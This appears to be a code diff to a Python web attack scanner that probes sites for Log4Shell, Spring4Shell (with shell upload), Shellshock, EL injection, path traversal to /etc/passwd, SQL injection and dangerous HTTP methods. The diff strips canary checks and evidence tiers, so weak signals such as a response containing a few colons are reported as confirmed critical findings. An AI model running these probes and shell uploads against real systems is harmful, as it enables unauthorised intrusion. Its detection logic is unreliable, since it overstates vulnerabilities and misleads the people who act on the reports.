@@ -20,9 +20,7 @@ import re
 import time
 import json
 import threading
-import uuid
 from concurrent.futures import ThreadPoolExecutor, as_completed
-from difflib import SequenceMatcher
 from typing import Any, Dict, List, Optional, Set, Tuple
 from urllib.parse import urlparse, parse_qs, urlencode, urljoin, quote
 
@@ -62,52 +60,6 @@ def _req(sess, method: str, url: str, params=None, data=None, timeout=12, **kw):
         return sess.post(url, params=params, data=data, timeout=timeout, **kw)
     except Exception:
         return None
-
-def _status_is_blocked(status: int) -> bool:
-    return int(status or 0) in {401, 403, 406, 408, 409, 423, 429, 500, 502, 503, 504}
-
-def _normalise_body_for_compare(text: str, limit: int = 20000) -> str:
-    text = (text or "")[:limit]
-    text = re.sub(r"\b\d{10,}\b", "N", text)
-    text = re.sub(r"\b[0-9a-f]{16,}\b", "H", text, flags=re.I)
-    text = re.sub(r"\s+", " ", text)
-    return text.strip()
-
-def _body_similarity(left: str, right: str) -> float:
-    left_n = _normalise_body_for_compare(left)
-    right_n = _normalise_body_for_compare(right)
-    if not left_n and not right_n:
-        return 1.0
-    return SequenceMatcher(None, left_n, right_n).ratio()
-
-def _response_size(resp) -> int:
-    try:
-        return len(resp.content)
-    except Exception:
-        return len(getattr(resp, "text", "") or "")
-
-def _median_int(values: List[int]) -> int:
-    if not values:
-        return 0
-    ordered = sorted(values)
-    mid = len(ordered) // 2
-    if len(ordered) % 2:
-        return ordered[mid]
-    return (ordered[mid - 1] + ordered[mid]) // 2
-
-def _most_common_int(values: List[int], default: int = 0) -> int:
-    counts: Dict[int, int] = {}
-    for value in values:
-        counts[value] = counts.get(value, 0) + 1
-    if not counts:
-        return default
-    return sorted(counts.items(), key=lambda item: (-item[1], item[0]))[0][0]
-
-def _finding_is_confirmed(finding: Dict[str, Any]) -> bool:
-    tier = str(finding.get("evidence_tier") or finding.get("confidence") or "").lower()
-    if tier:
-        return tier in {"confirmed", "verified", "exploited"}
-    return bool(finding.get("confirmed") is True or finding.get("verified") is True)
 
 def _banner(title: str) -> str:
     return f"\n{'─'*60}\n  {title}\n{'─'*60}"
@@ -166,72 +118,25 @@ def tech_fingerprint(
     print(_banner(_t("tech_stack_start", "🔬 Technology Stack Detection — {url}").format(url=url)))
     sess = _sess(session_headers)
 
-    found: Dict[str, float] = {}  # tech -> confidence score
-    evidence: Dict[str, List[str]] = {}
-
-    def _add_tech(tech: str, score: float, reason: str) -> None:
-        found[tech] = found.get(tech, 0.0) + score
-        evidence.setdefault(tech, []).append(reason)
+    found: Dict[str, float] = {}  # tech → confidence
 
     try:
         r = sess.get(url, timeout=15, verify=False)
     except Exception as e:
         return {"success": False, "technologies": [], "output": f"[TECH_FP] 오류: {e}"}
 
-    headers_text = str(dict(r.headers))
-    cookie_text = str(dict(r.cookies))
-    body_text = r.text[:20000]
-    path_text = urlparse(url).path
-    header_low = headers_text.lower()
-    cookie_low = cookie_text.lower()
-    body_low = body_text.lower()
-    path_low = path_text.lower()
-
-    # High-quality contextual signals first.  A single body ".php" should not
-    # beat a session cookie or a Java-style URL extension.
-    if "jsessionid" in cookie_low or "jsessionid" in header_low:
-        _add_tech("java", 80, "JSESSIONID cookie/header")
-    if re.search(r"\.(?:do|jsp|jspx|action)(?:$|[/?#])", path_low):
-        _add_tech("java", 65, "Java URL extension")
-    if "phpsessid" in cookie_low:
-        _add_tech("php", 80, "PHPSESSID cookie")
-    if re.search(r"\.php(?:$|[/?#])", path_low):
-        _add_tech("php", 60, "PHP URL extension")
-
-    powered_by = str(r.headers.get("X-Powered-By", r.headers.get("x-powered-by", "")))
-    server_hdr = str(r.headers.get("Server", r.headers.get("server", "")))
-    if "php" in powered_by.lower():
-        _add_tech("php", 90, "X-Powered-By")
-    if "asp.net" in powered_by.lower():
-        _add_tech("asp.net", 90, "X-Powered-By")
-    if "express" in powered_by.lower():
-        _add_tech("express", 80, "X-Powered-By")
-    if "nginx" in server_hdr.lower():
-        _add_tech("nginx", 75, "Server header")
-    if "apache" in server_hdr.lower():
-        _add_tech("apache", 75, "Server header")
-    if "microsoft-iis" in server_hdr.lower():
-        _add_tech("iis", 80, "Server header")
+    # 헤더 + 바디 + 쿠키 통합 검사
+    scan_text = "\n".join([
+        str(dict(r.headers)),
+        r.text[:20000],
+        str(dict(r.cookies)),
+    ])
 
     for tech, sigs in _TECH_SIGNATURES.items():
-        for sig in sigs:
-            sig_low = sig.lower()
-            if sig_low in header_low:
-                _add_tech(tech, 45, f"header:{sig}")
-            elif sig_low in cookie_low:
-                _add_tech(tech, 55, f"cookie:{sig}")
-            elif sig_low in path_low:
-                _add_tech(tech, 35, f"url:{sig}")
-            elif sig_low in body_low:
-                body_weight = 40 if any(
-                    strong in sig_low for strong in (
-                        "wp-content", "wp-includes", "__next_data__",
-                        "_next/static", "ng-version", "data-reactroot",
-                    )
-                ) else 10
-                _add_tech(tech, body_weight, f"body:{sig}")
-
-    found = {tech: min(100.0, score) for tech, score in found.items() if score >= 15}
+        hits = sum(1 for s in sigs if s.lower() in scan_text.lower())
+        if hits > 0:
+            confidence = min(100, hits * 30)
+            found[tech] = confidence
 
     # 분류
     cms_list = ["wordpress", "joomla", "drupal"]
@@ -239,20 +144,11 @@ def tech_fingerprint(
     db_list = ["mysql", "postgresql", "mssql", "oracle", "sqlite", "mongodb", "redis", "elasticsearch"]
     server_list = ["nginx", "apache", "iis", "cloudflare", "aws"]
 
-    techs = sorted(found.items(), key=lambda x: (-x[1], x[0]))
-
-    def _best(category: List[str], min_score: float = 35.0, tie_gap: float = 12.0) -> Optional[str]:
-        candidates = [(t, s) for t, s in techs if t in category and s >= min_score]
-        if not candidates:
-            return None
-        if len(candidates) > 1 and abs(candidates[0][1] - candidates[1][1]) < tie_gap:
-            return None
-        return candidates[0][0]
-
-    cms = _best(cms_list)
-    backend = _best(backend_list)
-    db = _best(db_list)
-    server = _best(server_list)
+    techs = sorted(found.items(), key=lambda x: -x[1])
+    cms = next((t for t, _ in techs if t in cms_list), None)
+    backend = next((t for t, _ in techs if t in backend_list), None)
+    db = next((t for t, _ in techs if t in db_list), None)
+    server = next((t for t, _ in techs if t in server_list), None)
 
     output_lines = [
         f"[TECH_FP] {url}",
@@ -272,7 +168,6 @@ def tech_fingerprint(
         "backend": backend,
         "db": db,
         "server": server,
-        "evidence": evidence,
         "output": "\n".join(output_lines),
     }
 
@@ -304,7 +199,6 @@ def cve_scan(
     print(_banner(_t("cve_auto_start", "🔎 CVE Auto Scan — {url}").format(url=url)))
     sess = _sess(session_headers)
     findings = []
-    candidates = []
 
     # ── Log4Shell ─────────────────────────────────────────────────────────────
     print("  [1/5] Log4Shell (CVE-2021-44228)...")
@@ -321,16 +215,15 @@ def cve_scan(
             t0 = time.time()
             r = sess.get(url, headers={hdr: log4shell_payload}, timeout=5, verify=False)
             elapsed = time.time() - t0
-            # OAST callback이 없으면 JNDI 반영은 후보일 뿐이다.
+            # 에러 응답이나 연결 지연은 Log4Shell 가능성
             if r.status_code in (400, 500) and "jndi" in r.text.lower():
-                candidates.append({
+                findings.append({
                     "cve": "CVE-2021-44228",
                     "header": hdr,
                     "note": f"JNDI 반영 — status={r.status_code}",
-                    "severity": "MEDIUM",
-                    "evidence_tier": "candidate",
+                    "severity": "CRITICAL",
                 })
-                print(_t("cve_log4shell_possible", "  🟡 Log4Shell candidate: {hdr}").format(hdr=hdr))
+                print(_t("cve_log4shell_possible", "  🔴 Log4Shell possible: {hdr}").format(hdr=hdr))
                 break
         except Exception:
             pass
@@ -352,7 +245,6 @@ def cve_scan(
                         "shell_url": shell_url,
                         "note": "Shell uploaded!",
                         "severity": "CRITICAL",
-                        "evidence_tier": "confirmed",
                     })
                     print(f"  🔴 Spring4Shell RCE: {shell_url}")
             except Exception:
@@ -362,68 +254,20 @@ def cve_scan(
 
     # ── Shellshock ────────────────────────────────────────────────────────────
     print("  [3/5] Shellshock (CVE-2014-6271)...")
-    shellshock_canary = f"BINGO_SHELLSHOCK_{uuid.uuid4().hex[:12]}"
-    try:
-        baseline_r = sess.get(url, timeout=8, verify=False)
-        baseline_text = baseline_r.text if baseline_r is not None else ""
-    except Exception:
-        baseline_text = ""
-    shellshock_payloads = [
-        (
-            f"() {{ :; }}; echo; echo {shellshock_canary}",
-            "canary_echo",
-        ),
-        (
-            f"() {{ :; }}; /bin/echo {shellshock_canary}",
-            "bin_echo",
-        ),
-    ]
-    for _db_payload, hdr in SHELLSHOCK_DB[:3]:
-        for payload, variant in shellshock_payloads:
-            try:
-                negative_r = sess.get(url, headers={hdr: f"BINGO_NEG_{shellshock_canary}"}, timeout=8, verify=False)
-                negative_text = negative_r.text if negative_r is not None else ""
-            except Exception:
-                negative_text = ""
-            try:
-                r = sess.get(url, headers={hdr: payload}, timeout=8, verify=False)
-                if (
-                    shellshock_canary in r.text
-                    and shellshock_canary not in baseline_text
-                    and shellshock_canary not in negative_text
-                ):
-                    findings.append({
-                        "cve": "CVE-2014-6271",
-                        "header": hdr,
-                        "note": f"Shellshock canary echoed ({variant})",
-                        "severity": "CRITICAL",
-                        "evidence_tier": "confirmed",
-                        "canary": shellshock_canary,
-                    })
-                    print(f"  🔴 Shellshock confirmed via {hdr}")
-                    break
-            except Exception:
-                pass
-        if any(f.get("cve") == "CVE-2014-6271" for f in findings):
-            break
-    else:
-        for payload, hdr in SHELLSHOCK_DB[:3]:
-            # Keep legacy payload execution as a transport probe only; never
-            # promote generic response changes or pre-existing uid text.
-            try:
-                r = sess.get(url, headers={hdr: payload}, timeout=8, verify=False)
-                if "uid=" in r.text and "uid=" not in baseline_text:
-                    candidates.append({
-                        "cve": "CVE-2014-6271",
-                        "header": hdr,
-                        "note": "uid-like text observed without canary confirmation",
-                        "severity": "MEDIUM",
-                        "evidence_tier": "candidate",
-                    })
-                    print(f"  🟡 Shellshock candidate via {hdr} (canary not confirmed)")
-                    break
-            except Exception:
-                pass
+    for payload, hdr in SHELLSHOCK_DB[:3]:
+        try:
+            r = sess.get(url, headers={hdr: payload}, timeout=8, verify=False)
+            if "uid=" in r.text or r.text.count(":") > 3:
+                findings.append({
+                    "cve": "CVE-2014-6271",
+                    "header": hdr,
+                    "note": "Shellshock: id 실행됨",
+                    "severity": "CRITICAL",
+                })
+                print(f"  🔴 Shellshock confirmed via {hdr}")
+                break
+        except Exception:
+            pass
 
     # ── EL Injection ──────────────────────────────────────────────────────────
     print("  [4/5] EL/SpEL Injection...")
@@ -441,7 +285,6 @@ def cve_scan(
                         "payload": el_payload[:60],
                         "note": f"Expected '{expected}' found",
                         "severity": "HIGH",
-                        "evidence_tier": "confirmed",
                     })
                     print(f"  🔴 EL Injection: {el_payload[:50]}")
                     break
@@ -467,28 +310,20 @@ def cve_scan(
                         "payload": tp,
                         "note": "etc/passwd 내용 노출",
                         "severity": "HIGH",
-                        "evidence_tier": "confirmed",
                     })
                     print(f"  🔴 Path Traversal: {params[0]}={tp}")
                     break
             except Exception:
                 pass
 
-    confirmed_count = sum(1 for f in findings if _finding_is_confirmed(f))
-    summary = _t("cve_findings_summary", "[CVE_SCAN] {url} — {n} CVE(s) found").format(url=url, n=confirmed_count)
+    summary = _t("cve_findings_summary", "[CVE_SCAN] {url} — {n} CVE(s) found").format(url=url, n=len(findings))
     print(f"\n  {summary}")
 
     return {
-        "success": confirmed_count > 0,
+        "success": bool(findings),
         "vuln_type": "CVE",
         "findings": findings,
-        "candidates": candidates,
-        "output": summary + (
-            "\n"
-            + "\n".join(f"  [{f['severity']}] {f['cve']}: {f.get('note','')}" for f in findings)
-            + ("\nCandidates:\n" + "\n".join(f"  [{f['severity']}] {f['cve']}: {f.get('note','')}" for f in candidates) if candidates else "")
-            if findings or candidates else ""
-        ),
+        "output": summary + ("\n" + "\n".join(f"  [{f['severity']}] {f['cve']}: {f.get('note','')}" for f in findings) if findings else ""),
     }
 
 # ══════════════════════════════════════════════════════════════════════════════
@@ -595,7 +430,6 @@ def dom_xss_scan(
                         "payload": payload,
                         "type": "dom_title",
                         "evidence": f"title='{title}'",
-                        "evidence_tier": "confirmed",
                     })
                 elif dialogs:
                     print(f"  🔴 DOM XSS (dialog): {payload[:60]} — alert({dialogs[-1]})")
@@ -603,7 +437,6 @@ def dom_xss_scan(
                         "payload": payload,
                         "type": "dom_alert",
                         "evidence": f"alert: {dialogs[-1]}",
-                        "evidence_tier": "confirmed",
                     })
                 elif MARKER in "\n".join(console_msgs):
                     print(f"  🔴 DOM XSS (console): {payload[:60]}")
@@ -611,7 +444,6 @@ def dom_xss_scan(
                         "payload": payload,
                         "type": "dom_console",
                         "evidence": "console.log triggered",
-                        "evidence_tier": "confirmed",
                     })
 
                 # DOM sink 분석
@@ -737,71 +569,39 @@ def param_fuzz(
     words = (wordlist or PARAM_WORDLIST)[:max_params]
     sess = _sess(session_headers)
 
-    # 베이스라인은 반복 측정으로 페이지 자체 변동폭을 먼저 잡는다.
-    baseline_responses = [
-        r for r in (_req(sess, method, url, timeout=8) for _ in range(3)) if r is not None
-    ]
-    if not baseline_responses:
-        return {"success": False, "found_params": [], "output": "[PARAM_FUZZ] baseline request failed"}
-    baseline_sizes = [_response_size(r) for r in baseline_responses]
-    baseline_size = _median_int(baseline_sizes)
-    baseline_status = _most_common_int([int(r.status_code) for r in baseline_responses], 200)
-    baseline_noise = max(abs(size - baseline_size) for size in baseline_sizes)
-    baseline_text = baseline_responses[-1].text
-    min_diff = max(512, int(baseline_size * 0.01), baseline_noise * 4 + 128)
+    # 베이스라인
+    base_r = _req(sess, method, url)
+    baseline_size = len(base_r.content) if base_r else 0
+    baseline_status = base_r.status_code if base_r else 200
     print(_t("param_fuzz_baseline", "  Baseline: {status} {size}B").format(status=baseline_status, size=baseline_size))
 
     found_params: List[Dict] = []
 
-    def _send_param(pname: str):
-        p = {pname: test_value}
-        return _req(sess, method, url,
-                    params=p if method.upper() == "GET" else None,
-                    data=p if method.upper() == "POST" else None,
-                    timeout=8)
-
-    def _evaluate_param_response(pname: str, r) -> Optional[Dict]:
-        if r is None:
-            return None
-        if _status_is_blocked(int(r.status_code)) or r.status_code in (400, 404, 405):
-            return None
-
-        response_size = _response_size(r)
-        sz_diff = abs(response_size - baseline_size)
-        status_change = r.status_code != baseline_status
-        similarity = _body_similarity(r.text, baseline_text)
-        reflected = test_value in r.text and test_value not in baseline_text
-
-        if reflected:
-            evidence = "marker_reflection"
-        elif status_change and not _status_is_blocked(baseline_status):
-            evidence = "stable_status_change"
-        elif sz_diff >= min_diff and similarity < 0.985:
-            evidence = "stable_body_change"
-        else:
-            return None
-
-        return {
-            "param": pname,
-            "status": r.status_code,
-            "size_diff": sz_diff,
-            "status_change": status_change,
-            "similarity": round(similarity, 4),
-            "evidence": evidence,
-            "evidence_tier": "candidate",
-        }
-
     def _test_param(pname: str) -> Optional[Dict]:
         try:
-            first = _evaluate_param_response(pname, _send_param(pname))
-            if not first:
+            p = {pname: test_value}
+            r = _req(sess, method, url,
+                     params=p if method.upper() == "GET" else None,
+                     data=p if method.upper() == "POST" else None,
+                     timeout=8)
+            if r is None:
                 return None
-            second = _evaluate_param_response(pname, _send_param(pname))
-            if not second:
-                return None
-            first["size_diff"] = min(first["size_diff"], second["size_diff"])
-            first["similarity"] = min(first["similarity"], second["similarity"])
-            return first
+
+            sz_diff = abs(len(r.content) - baseline_size)
+            status_change = r.status_code != baseline_status
+
+            # 유의미한 변화
+            if sz_diff > 200 or status_change:
+                # 에러 페이지인지 확인
+                if r.status_code in (400, 404, 405):
+                    return None  # 일반적인 에러
+                # 실제 반응이 있는 파라미터
+                return {
+                    "param": pname,
+                    "status": r.status_code,
+                    "size_diff": sz_diff,
+                    "status_change": status_change,
+                }
         except Exception:
             pass
         return None
@@ -915,35 +715,19 @@ def sqli_scan_plus(
                     detected_db = db
                     break
             print(f"  🔴 SQLi Error [{db_type}]: {payload[:50]}")
-            findings.append({
-                "type": "error",
-                "payload": payload,
-                "db": detected_db,
-                "errors": matched_errors[:2],
-                "evidence_tier": "confirmed",
-            })
+            findings.append({"type": "error", "payload": payload, "db": detected_db, "errors": matched_errors[:2]})
             if len(findings) >= 3:
                 break
 
         # Union 기반 (응답 크기 변화)
         elif det_type == "union" and sz_diff > 500 and r.status_code == 200:
             print(f"  🟡 SQLi Union?: {payload[:50]} (diff={sz_diff}B)")
-            findings.append({
-                "type": "union",
-                "payload": payload,
-                "size_diff": sz_diff,
-                "evidence_tier": "candidate",
-            })
+            findings.append({"type": "union", "payload": payload, "size_diff": sz_diff})
 
         # Time-based
         elif det_type == "time" and elapsed >= 4.0:
             print(f"  🔴 SQLi Time-based: {payload[:50]} ({elapsed:.1f}s)")
-            findings.append({
-                "type": "time",
-                "payload": payload,
-                "elapsed": elapsed,
-                "evidence_tier": "confirmed",
-            })
+            findings.append({"type": "time", "payload": payload, "elapsed": elapsed})
             break
 
     return {
@@ -1078,136 +862,62 @@ def http_method_scan(
     sess = _sess(session_headers)
     findings = []
     allowed_methods = []
-    candidates = []
-    canary = f"BINGO_METHOD_{uuid.uuid4().hex[:12]}"
 
-    def _method_test_url() -> str:
-        parsed = urlparse(url)
-        base_path = parsed.path
-        if not base_path or base_path.endswith("/"):
-            return urljoin(url, f"{canary}.txt")
-        return urljoin(url, f"./{canary}.txt")
+    METHODS_TO_TEST = {
+        "OPTIONS": None,
+        "TRACE": "HTTP TRACE response",
+        "PUT": None,
+        "DELETE": None,
+        "PATCH": None,
+        "CONNECT": None,
+        "HEAD": None,
+        "DEBUG": None,  # IIS specific
+        "PROPFIND": "DAV:",  # WebDAV
+        "MKCOL": None,
+    }
 
-    def _mark_candidate(method: str, status: int, note: str, evidence: str = "status_observed") -> None:
-        candidates.append({
-            "method": method,
-            "status": status,
-            "note": note,
-            "severity": "INFO",
-            "evidence": evidence,
-            "evidence_tier": "candidate",
-        })
+    for method, sig in METHODS_TO_TEST.items():
+        try:
+            r = sess.request(method, url, timeout=8, verify=False)
+            if r.status_code not in (405, 501, 400):
+                allowed_methods.append(method)
+                severity = "MEDIUM"
+                note = f"허용됨 (status={r.status_code})"
 
-    def _mark_confirmed(method: str, status: int, note: str, severity: str, evidence: str) -> None:
-        if method not in allowed_methods:
-            allowed_methods.append(method)
-        findings.append({
-            "method": method,
-            "status": status,
-            "note": note,
-            "severity": severity,
-            "evidence": evidence,
-            "evidence_tier": "confirmed",
-        })
+                if method == "TRACE" and r.status_code == 200:
+                    severity = "HIGH"
+                    note = "XST (Cross-Site Tracing) 위험!"
+                elif method in ("PUT", "DELETE"):
+                    severity = "HIGH"
+                    note = f"파일 시스템 변경 가능! status={r.status_code}"
+                elif method == "PROPFIND" and ("DAV:" in r.text or sig in str(r.headers)):
+                    severity = "HIGH"
+                    note = "WebDAV 활성화!"
 
-    # OPTIONS 응답에서 Allow 헤더 확인. 광고된 메서드는 후보이고 실제 위험
-    # 판단은 아래 method-specific proof에서만 확정한다.
+                if method in ("TRACE", "PUT", "DELETE", "PROPFIND"):
+                    print(f"  🔴 [{severity}] {method}: {note}")
+                    findings.append({"method": method, "status": r.status_code, "note": note, "severity": severity})
+                else:
+                    print(f"  🟡 {method}: {note}")
+        except Exception:
+            pass
+
+    # OPTIONS 응답에서 Allow 헤더 확인
     try:
         r = sess.options(url, timeout=8, verify=False)
         allow = r.headers.get("Allow", r.headers.get("allow", ""))
-        if allow and not _status_is_blocked(int(r.status_code)) and r.status_code not in (400, 405, 501):
+        if allow:
             print(_t("allow_header_label", "  Allow header: {allow}").format(allow=allow))
-            advertised = [m.strip().upper() for m in allow.split(",") if m.strip()]
-            for m in advertised:
-                if m not in allowed_methods:
-                    allowed_methods.append(m)
-            dangerous = [m for m in ["PUT", "DELETE", "TRACE", "CONNECT", "PROPFIND"] if m in advertised]
+            dangerous = [m for m in ["PUT", "DELETE", "TRACE", "CONNECT"] if m in allow]
             for m in dangerous:
-                _mark_candidate(m, r.status_code, f"Allow header advertises method: {allow}", "allow_header")
+                findings.append({"method": m, "note": f"Allow 헤더에 위험 메서드: {allow}", "severity": "HIGH"})
     except Exception:
         pass
-
-    # TRACE: exact request echo proof.
-    try:
-        r = sess.request("TRACE", url, headers={"X-Bingo-Trace": canary}, timeout=8, verify=False)
-        body = r.text or ""
-        if (
-            r.status_code == 200
-            and not _status_is_blocked(int(r.status_code))
-            and (f"X-Bingo-Trace: {canary}" in body or canary in body)
-        ):
-            note = "TRACE request echo confirmed"
-            print(f"  🔴 [HIGH] TRACE: {note}")
-            _mark_confirmed("TRACE", r.status_code, note, "HIGH", "trace_echo")
-    except Exception:
-        pass
-
-    # PUT/DELETE: controlled resource state transition proof.
-    put_url = _method_test_url()
-    put_confirmed = False
-    try:
-        put_r = sess.request("PUT", put_url, data=canary, timeout=8, verify=False)
-        if put_r is not None and not _status_is_blocked(int(put_r.status_code)) and put_r.status_code not in (400, 405, 409, 501):
-            get_r = sess.get(put_url, timeout=8, verify=False)
-            if get_r is not None and get_r.status_code == 200 and canary in (get_r.text or ""):
-                put_confirmed = True
-                note = f"PUT upload verified at controlled URL ({put_url})"
-                print(f"  🔴 [HIGH] PUT: {note}")
-                _mark_confirmed("PUT", put_r.status_code, note, "HIGH", "put_get_canary")
-            else:
-                _mark_candidate("PUT", int(put_r.status_code), "PUT returned non-blocked status but upload was not retrievable")
-    except Exception:
-        pass
-
-    try:
-        if put_confirmed:
-            del_r = sess.request("DELETE", put_url, timeout=8, verify=False)
-            get_after = sess.get(put_url, timeout=8, verify=False)
-            removed = get_after is None or get_after.status_code in (404, 410) or canary not in (get_after.text or "")
-            if del_r is not None and not _status_is_blocked(int(del_r.status_code)) and removed:
-                note = f"DELETE removed controlled resource ({put_url})"
-                print(f"  🔴 [HIGH] DELETE: {note}")
-                _mark_confirmed("DELETE", del_r.status_code, note, "HIGH", "delete_state_transition")
-        else:
-            del_r = sess.request("DELETE", url, timeout=8, verify=False)
-            if del_r is not None and not _status_is_blocked(int(del_r.status_code)) and del_r.status_code not in (400, 405, 501):
-                _mark_candidate("DELETE", int(del_r.status_code), "DELETE returned non-blocked status, but no controlled resource transition was verified")
-    except Exception:
-        pass
-
-    # PROPFIND: WebDAV-specific header/body proof.
-    try:
-        r = sess.request("PROPFIND", url, timeout=8, verify=False)
-        dav_header = str(r.headers.get("DAV", r.headers.get("Dav", "")))
-        body = (r.text or "").lower()
-        if (
-            r.status_code in (200, 207)
-            and not _status_is_blocked(int(r.status_code))
-            and (dav_header or "multistatus" in body or "resourcetype" in body)
-        ):
-            note = "WebDAV PROPFIND proof found"
-            print(f"  🔴 [HIGH] PROPFIND: {note}")
-            _mark_confirmed("PROPFIND", r.status_code, note, "HIGH", "dav_header_or_multistatus")
-    except Exception:
-        pass
-
-    # Other methods are reported only as candidates when they return a clean 2xx.
-    for method in ("PATCH", "CONNECT", "HEAD", "DEBUG", "MKCOL"):
-        try:
-            r = sess.request(method, url, timeout=8, verify=False)
-            if r.status_code in (200, 201, 202, 204) and not _status_is_blocked(int(r.status_code)):
-                if method not in allowed_methods:
-                    allowed_methods.append(method)
-                _mark_candidate(method, r.status_code, f"Observed {method} status={r.status_code}; no impact proof")
-                print(f"  🟡 {method}: observed status={r.status_code} (candidate only)")
-        except Exception:
-            pass
 
     output = (
         f"[HTTP_METHOD] {url}\n"
         f"  허용된 메서드: {', '.join(allowed_methods)}\n"
         + "\n".join(f"  [{f.get('severity','?')}] {f['method']}: {f['note']}" for f in findings)
-        + (("\nCandidates:\n" + "\n".join(f"  [{f.get('severity','?')}] {f['method']}: {f['note']}" for f in candidates[:10])) if candidates else "")
     )
 
     return {
@@ -1215,7 +925,6 @@ def http_method_scan(
         "vuln_type": "HTTPMethod",
         "allowed_methods": allowed_methods,
         "findings": findings,
-        "candidates": candidates,
         "output": output,
     }
 
@@ -1245,7 +954,6 @@ def api_security_scan(
     print(_banner(_t("api_sec_banner", "🔑 API Security Scan — {url}").format(url=url)))
     sess = _sess(session_headers)
     findings = []
-    observations = []
 
     parsed = urlparse(url)
     base = f"{parsed.scheme}://{parsed.netloc}"
@@ -1292,7 +1000,6 @@ def api_security_scan(
                     "sensitive": sensitive,
                     "note": note,
                     "severity": severity,
-                    "evidence_tier": "confirmed" if sensitive else "candidate",
                 })
         except Exception:
             pass
@@ -1301,44 +1008,29 @@ def api_security_scan(
     print(_t("rate_limit_test", "  ⏱ Rate Limiting test..."))
     try:
         statuses = []
-        sizes = []
         for _ in range(10):
             r = sess.get(url, timeout=3, verify=False)
             statuses.append(r.status_code)
-            sizes.append(_response_size(r))
-        rate_sensitive = bool(re.search(
-            r"/(?:login|auth|token|otp|mfa|password|reset|verify)(?:[/?#]|$)",
-            parsed.path,
-            re.I,
-        ))
         if 429 not in statuses and 503 not in statuses:
-            observations.append({
+            findings.append({
                 "path": url,
-                "note": "Rate-limit challenge not observed during bounded 10-request probe",
-                "severity": "INFO",
-                "evidence_tier": "observation",
-                "rate_sensitive_endpoint": rate_sensitive,
-                "statuses": statuses,
-                "size_noise": max(sizes) - min(sizes) if sizes else 0,
+                "note": "Rate Limiting 미적용 — 10회 연속 요청 모두 허용",
+                "severity": "MEDIUM",
             })
-            print(_t("rate_limit_none", "  🟡 No Rate Limiting observed (observation only)"))
+            print(_t("rate_limit_none", "  🟡 No Rate Limiting"))
     except Exception:
         pass
 
-    confirmed_findings = [f for f in findings if _finding_is_confirmed(f)]
     output = (
         f"[API_SCAN] {url}\n"
-        f"  발견: {len(confirmed_findings)}개\n"
-        + "\n".join(f"  [{f.get('severity','?')}] {f['path']}: {f['note']}" for f in confirmed_findings[:10])
-        + (("\nObservations:\n" + "\n".join(f"  [{f.get('severity','?')}] {f['path']}: {f['note']}" for f in observations[:5])) if observations else "")
+        f"  발견: {len(findings)}개\n"
+        + "\n".join(f"  [{f.get('severity','?')}] {f['path']}: {f['note']}" for f in findings[:10])
     )
 
     return {
-        "success": bool(confirmed_findings),
+        "success": bool(findings),
         "vuln_type": "APISecurity",
-        "findings": confirmed_findings,
-        "candidates": [f for f in findings if not _finding_is_confirmed(f)],
-        "observations": observations,
+        "findings": findings,
         "output": output,
     }
 
@@ -1374,23 +1066,7 @@ def full_deep_scan(
     print(f"  Playwright: {'✅' if use_playwright else '❌'}")
 
     all_findings: List[Dict] = []
-    candidate_findings: List[Dict] = []
     scan_errors: List[str] = []
-
-    def _collect_finding(finding: Dict[str, Any], category: str, default_confirmed: bool = False) -> None:
-        item = {**finding, "category": category}
-        if _finding_is_confirmed(item) or (default_confirmed and not item.get("evidence_tier")):
-            item.setdefault("evidence_tier", "confirmed")
-            all_findings.append(item)
-        else:
-            item.setdefault("evidence_tier", "candidate")
-            candidate_findings.append(item)
-
-    def _collect_candidates(result: Dict[str, Any], category: str) -> None:
-        for candidate in result.get("candidates", []) or []:
-            item = {**candidate, "category": category}
-            item.setdefault("evidence_tier", "candidate")
-            candidate_findings.append(item)
 
     def _safe(fn, *args, **kwargs):
         try:
@@ -1409,15 +1085,13 @@ def full_deep_scan(
     print("\n" + _t("fds_step2", "[2/10] CVE Auto Scan..."))
     cve_result = _safe(cve_scan, url, session_headers)
     for f in cve_result.get("findings", []):
-        _collect_finding(f, "CVE")
-    _collect_candidates(cve_result, "CVE")
+        all_findings.append({**f, "category": "CVE"})
 
     # ── 3. HTTP 메서드 스캔 ───────────────────────────────────────────────────
     print("\n" + _t("fds_step3", "[3/10] HTTP Method Scan..."))
     method_result = _safe(http_method_scan, url, session_headers)
     for f in method_result.get("findings", []):
-        _collect_finding(f, "HTTPMethod")
-    _collect_candidates(method_result, "HTTPMethod")
+        all_findings.append({**f, "category": "HTTPMethod"})
 
     # ── 4. 파라미터 퍼징 ──────────────────────────────────────────────────────
     print("\n" + _t("fds_step4", "[4/10] Parameter Fuzzing (200)..."))
@@ -1428,15 +1102,14 @@ def full_deep_scan(
     print("\n" + _t("fds_step5", "[5/10] API Security Scan..."))
     api_result = _safe(api_security_scan, url, session_headers)
     for f in api_result.get("findings", []):
-        _collect_finding(f, "API")
-    _collect_candidates(api_result, "API")
+        all_findings.append({**f, "category": "API"})
 
     # ── 6. CMS 특화 스캔 ──────────────────────────────────────────────────────
     if cms == "wordpress":
         print("\n" + _t("fds_step6_wp", "[6/10] WordPress Specialized Scan..."))
         wp_result = _safe(wordpress_scan, url, session_headers)
         for f in wp_result.get("findings", []):
-            _collect_finding(f, "WordPress", default_confirmed=False)
+            all_findings.append({**f, "category": "WordPress"})
     else:
         print(f"\n{_t('cms_scan_skip', '[6/10] CMS scan skipped (cms={cms})').format(cms=cms)}")
 
@@ -1461,7 +1134,7 @@ def full_deep_scan(
     if targets:
         vuln_scan = _safe(full_site_scan, url, session_headers, max_params, None, True)
         for f in vuln_scan.get("findings", []):
-            _collect_finding(f, f.get("vuln_type", "Vuln"))
+            all_findings.append({**f, "category": f.get("vuln_type", "Vuln")})
     
     # SQLi 강화 스캔
     for target in targets[:3]:
@@ -1469,7 +1142,7 @@ def full_deep_scan(
             sqli_r = _safe(sqli_scan_plus, target["url"], param,
                           target.get("method", "GET"), session_headers=session_headers)
             for f in sqli_r.get("findings", []):
-                _collect_finding({**f, "param": param}, "SQLi")
+                all_findings.append({**f, "category": "SQLi", "param": param})
 
     # ── 8. DOM XSS 스캔 ───────────────────────────────────────────────────────
     if use_playwright:
@@ -1478,7 +1151,7 @@ def full_deep_scan(
         if url_params:
             dom_r = _safe(dom_xss_scan, url, url_params[0], session_headers)
             for f in dom_r.get("findings", []):
-                _collect_finding(f, "DOM_XSS", default_confirmed=True)
+                all_findings.append({**f, "category": "DOM_XSS"})
     else:
         print(_t("fds_step8_skip", "\n[8/10] DOM XSS scan skipped (no playwright)"))
 
@@ -1487,18 +1160,14 @@ def full_deep_scan(
     from .vuln_scanner_plus import header_injection_scan
     hdr_r = _safe(header_injection_scan, url, session_headers)
     for f in hdr_r.get("findings", []):
